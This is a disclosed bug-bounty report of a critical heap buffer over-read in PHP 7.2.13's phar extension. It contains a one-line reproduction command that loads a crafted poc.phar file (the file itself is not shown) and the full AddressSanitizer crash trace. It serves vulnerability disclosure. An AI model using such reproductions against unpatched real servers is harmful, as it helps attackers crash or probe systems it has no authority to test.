# heap buffer overflow in phar_detect_phar_fname_ext

## Report Details
- **Report ID**: 475499
- **URL**: https://hackerone.com/reports/475499
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-01-07T08:54:00.606Z
- **Disclosed**: 2020-10-10T03:51:12.341Z

## Reporter
- **Username**: chihuahua
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
The original report is here  https://bugs.php.net/bug.php?id=77247

```txt
USE_ZEND_ALLOC=0 ./php-src-PHP-7.2.13/sapi/cli/php -r "var_dump(new Phar(file_get_contents('poc.phar'),0,'test.phar'));"
```
```txt
=================================================================
==44888==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60600001bf60 at pc 0x7f17ca1cf935 bp 0x7ffc7b01ac20 sp 0x7ffc7b01a3c8
READ of size 26 at 0x60600001bf60 thread T0
    #0 0x7f17ca1cf934  (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x3e934)
    #1 0xf81430 in phar_detect_phar_fname_ext /home/hackyzh/Desktop/php-src-PHP-7.2.13/ext/phar/phar.c:2011
    #2 0xf8479c in phar_split_fname /home/hackyzh/Desktop/php-src-PHP-7.2.13/ext/phar/phar.c:2218
    #3 0xfc279e in zim_Phar___construct /home/hackyzh/Desktop/php-src-PHP-7.2.13/ext/phar/phar_object.c:1178
    #4 0x223908e in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_vm_execute.h:907
    #5 0x223c022 in execute_ex /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_vm_execute.h:59765
    #6 0x2280678 in zend_execute /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_vm_execute.h:63776
    #7 0x1c4dc40 in zend_eval_stringl /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_execute_API.c:1083
    #8 0x1c4e1c0 in zend_eval_stringl_ex /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_execute_API.c:1124
    #9 0x228d5bf in do_cli /home/hackyzh/Desktop/php-src-PHP-7.2.13/sapi/cli/php_cli.c:1042
    #10 0x472cc9 in main /home/hackyzh/Desktop/php-src-PHP-7.2.13/sapi/cli/php_cli.c:1403
    #11 0x7f17c810c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #12 0x473308 in _start (/home/hackyzh/Desktop/php-src-PHP-7.2.13/sapi/cli/php+0x473308)

0x60600001bf60 is located 0 bytes to the right of 64-byte region [0x60600001bf20,0x60600001bf60)
allocated by thread T0 here:
    #0 0x7f17ca229961 in realloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98961)
    #1 0x1b688c0 in __zend_realloc /home/hackyzh/Desktop/php-src-PHP-7.2.13/Zend/zend_alloc.c:2845

SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ??
Shadow bytes around the buggy address:
  0x0c0c7fffb790: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fffb7a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fffb7b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fffb7c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c0c7fffb7d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c0c7fffb7e0: fa fa fa fa 00 00 00 00 00 00 00 00[fa]fa fa fa
  0x0c0c7fffb7f0: 00 00 00 00 00 00 00 06 fa fa fa fa 00 00 00 00
  0x0c0c7fffb800: 00 00 06 fa fa fa fa fa 00 00 00 00 00 00 00 fa
  0x0c0c7fffb810: fa fa fa fa 00 00 00 00 00 00 00 fa fa fa fa fa
  0x0c0c7fffb820: 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00
  0x0c0c7fffb830: 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
==44888==ABORTING
```

## Impact

Heap buffer over read

## Attachments
No attachments
